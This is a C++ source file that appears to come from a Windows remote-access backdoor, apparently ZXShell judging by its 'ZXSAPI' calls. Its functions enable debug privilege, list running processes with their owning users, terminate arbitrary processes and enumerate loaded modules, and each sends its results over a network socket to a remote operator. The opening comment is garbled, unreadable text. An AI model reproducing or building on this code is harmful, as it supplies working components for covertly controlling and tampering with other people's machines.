//�顢ɱ����
BOOL GetProcessUser(HANDLE hProc, TCHAR *szDomainName, TCHAR *szUserName, DWORD nNameLen)
{
	BOOL fResult  = FALSE;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	
	__try
	{

        fResult = ZXSAPI::OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}

		SID_NAME_USE sn;
		DWORD dwDmLen = MAX_PATH;
		fResult = ZXSAPI::LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;

		return fResult;
	}
}

int Pslist(SOCKET Socket)
{
/*       HANDLE             SnapP = NULL;
       HANDLE             OpprcssInf = NULL;
       PROCESSENTRY32     pr32 = {0};
       HMODULE            hMods[1024] = {0};
       DWORD              cbMNeeded;
       char               szProcessName[MAX_PATH] = {0};
       char               ProcessName[12];

       DebugPrivilege(SE_DEBUG_NAME,TRUE);
       SnapP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
       if(SnapP == (HANDLE)-1)
         {
          sprintf(Temp,"CreateToolhelp32Snapshot Failed:Error%d",GetLastError());
		  SendMessage(Socket,Temp);
          return 1;
         }
       pr32.dwSize = sizeof(PROCESSENTRY32);
       if(Process32First(SnapP,&pr32))
         {
		   sprintf(Temp,"PID     Process      FilePath\r\n");
	       strcat(Temp,"-------------------------------------------------------------------------------\r\n");
	       SendMessage(Socket,Temp);
           do{      
                 OpprcssInf = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pr32.th32ProcessID);
				 if(pr32.th32ProcessID == 0||pr32.th32ProcessID == 4||pr32.th32ProcessID == 8)
					 continue;
				 EnumProcessModules(OpprcssInf, hMods, sizeof(hMods), &cbMNeeded);
				 GetModuleFileNameEx(OpprcssInf, hMods[0], szProcessName, sizeof(szProcessName)); 
				 memset(ProcessName,0,12);
				 strncpy(ProcessName,pr32.szExeFile,strlen(pr32.szExeFile)-4);
				 sprintf(Temp,"%-8d%-13s%s%\r\n",pr32.th32ProcessID,ProcessName,szProcessName);
				 SendMessage(Socket,Temp);
              }
           while(Process32Next(SnapP,&pr32));
		   sprintf(Temp,"\r\nList Processes Compeleted\r\n");
        }
       else
          sprintf(Temp,"Process32First() Fail:Error %d\r\n",GetLastError());
	   DebugPrivilege(SE_DEBUG_NAME,FALSE);
	   CloseHandle(SnapP);
	   SendMessage(Socket,Temp); 
	   memset(Temp,0,MAX_BUFF);
       return 0;*/
	// Get the list of process identifiers.
	DWORD aProcesses[1024], cbNeeded;
	unsigned int i;
	char szProcessName[MAX_PATH],szDisplay[2 * MAX_PATH];
	HANDLE hProcess;
	TCHAR szUserName[MAX_PATH]="\0",szDomainName[MAX_PATH]="\0";

	DebugPrivilege(SE_DEBUG_NAME,TRUE);

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		 SendMessage(Socket,"EnumProcesses() error.\r\n");
		return 1;
	}

	// Print the name and process identifier for each process.
	SendMessage(Socket,"\r\nPID\tDomain\\User\tProcess\r\n\r\n");


	for ( i = 0; i < cbNeeded / sizeof(DWORD); i++ )
	{
		ZeroMemory(szProcessName,MAX_PATH);
		ZeroMemory(szDisplay,MAX_PATH);

		// Get a handle to the process.
		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

		// Get the process name.

		if ( hProcess )
		{
			GetProcessUser(hProcess, szDomainName, szUserName, MAX_PATH);
			HMODULE hMod;
			DWORD cbNeeded;

			if ( ZXSAPI::EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded))
			{
				ZXSAPI::GetModuleFileNameEx( hProcess, hMod, szProcessName,sizeof(szProcessName));
			}
			if(aProcesses[i]==GetCurrentProcessId()) strcat(szProcessName," < I am here.>");
			wsprintf(szDisplay,"%d\t%s\\%s\t%s\r\n",aProcesses[i],szDomainName,szUserName,szProcessName);
			CloseHandle( hProcess );
		}
		else
		{
			wsprintf(szDisplay,"%d\tunknow\r\n",aProcesses[i]);
		}
	   SendMessage(Socket,szDisplay); 
	}
	DebugPrivilege(SE_DEBUG_NAME,FALSE);
		SendMessage(Socket,"\r\nList Processes Compeleted\r\n"); 
	return 0;
 }


int Pskill(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;

    DWORD PID;
	BOOL   bResult  = TRUE;
	HANDLE hProcess = NULL;

	if(argc < 2)
	{
		sprintf(Temp,"Usage: %s PID\r\n", argv[0]);
		bResult = FALSE;
		goto exit;
	}
    PID = atoi(argv[1]);

	DebugPrivilege(SE_DEBUG_NAME,TRUE);
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
	if(hProcess == NULL)
	{
		err_display(Socket, "Pskill->OpenProcess", 0);
		/*if(GetLastError() == 6)
		{
			sprintf(Temp,"Could Not Find The Process\r\n");
		}
		else
		{
   		 	sprintf(Temp,"OpenProcess Error: %d\r\n",GetLastError());
		}*/
		bResult = FALSE;
		goto exit;
	}

	if(!TerminateProcess(hProcess,0))
	{
		err_display(Socket, "Pskill->TerminateProcess", 0);
		//sprintf(Temp,"TerminateProcess Error: %d\r\n",GetLastError());
		bResult = FALSE;
		goto exit;
	}


	if(hProcess != NULL)
	{
		CloseHandle(hProcess);
	}


exit:
	if(bResult == TRUE)
	{
		err_display(Socket, "Pskill", 0);
		//sprintf(Temp,"Kill The Process %d(Pid) Successfully\r\n",PID);
	}
 	DebugPrivilege(SE_DEBUG_NAME,FALSE);
    SendMessage(Socket,Temp);
	memset(Temp,0,MAX_BUFF);
	return bResult;
}

int Modlist(SOCKET Socket,DWORD PID)
{
	HANDLE SnapP;
	struct tagMODULEENTRY32 modsnap;

	DebugPrivilege(SE_DEBUG_NAME,TRUE);
	SnapP = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,PID);
	modsnap.dwSize = sizeof(tagMODULEENTRY32);
	if(Module32First(SnapP,&modsnap))
	{
	   SendMessage(Socket, "The Process[%d] Module Infomation:\r\n\r\nModuleBAddr  ModuleName      ModulePath\r\n",PID);
	   SendMessage(Socket, "-------------------------------------------------------------------------------\r\n");
	   do
	   {   
		  SendMessage(Socket, "0x%-11x%-16s%s\r\n",modsnap.modBaseAddr,modsnap.szModule,modsnap.szExePath);
	   }
	   while(Module32Next(SnapP,&modsnap));
	   SendMessage(Socket, "\r\nList Process Module Compeleted\r\n");
	}
	else
	{
		err_display(Socket, "Modlist", 1);
       //sprintf(Temp,"Process32First() Fail:Error %d\r\n",GetLastError());
	}
	
	DebugPrivilege(SE_DEBUG_NAME,FALSE);
	CloseHandle(SnapP);

    return 0;
}

int Modlist(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;

	if(argc < 2)
	{
		SendMessage(Socket, "Usage: %s PID\r\n", argv[0]);
		return 0;
	}
	return Modlist(Socket, atoi(argv[1]));
}